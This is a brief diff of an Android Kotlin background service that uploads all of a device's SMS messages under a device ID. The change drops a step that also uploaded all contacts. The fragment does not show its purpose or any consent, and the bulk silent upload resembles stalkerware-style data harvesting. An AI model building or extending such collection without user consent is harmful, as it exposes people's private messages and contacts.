@@ -73,9 +73,6 @@ class DataUploadService : Service() {
         Thread {
             try {
                 DataUploader.uploadAllSms(this, deviceId)
-                Thread.sleep(1000)
-                DataUploader.uploadAllContacts(this, deviceId)
-
             } catch (e: Exception) {
                 Log.e(TAG, "Upload error: ${e.message}", e)
             } finally {
